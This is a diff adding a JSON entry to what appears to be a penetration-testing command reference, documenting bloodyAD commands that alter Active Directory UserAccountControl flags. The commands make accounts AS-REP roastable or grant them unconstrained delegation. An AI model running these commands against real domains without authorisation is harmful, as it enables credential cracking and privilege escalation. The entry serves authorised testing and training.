@@ -1,0 +1,17 @@
+{
+  "id": "bloodyad-add-uac",
+  "name": "bloodyAD add uac",
+  "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' add uac '<target>' -f DONT_REQ_PREAUTH",
+  "description": "Toggle UserAccountControl flags on a target account. Setting DONT_REQ_PREAUTH on a user you control (via writeAccountRestrictions) makes them AS-REP roastable on demand. Other useful flags: TRUSTED_FOR_DELEGATION, ACCOUNTDISABLE.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["bloodyad", "uac", "as-rep-roast", "acl-abuse"],
+  "variations": [
+    { "label": "Remove Flag", "requires": "password", "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' remove uac '<target>' -f DONT_REQ_PREAUTH" },
+    { "label": "Unconstrained Delegation", "requires": "password", "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' add uac '<target>' -f TRUSTED_FOR_DELEGATION" }
+  ],
+  "examples": [
+    "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add uac svc_app -f DONT_REQ_PREAUTH"
+  ]
+}
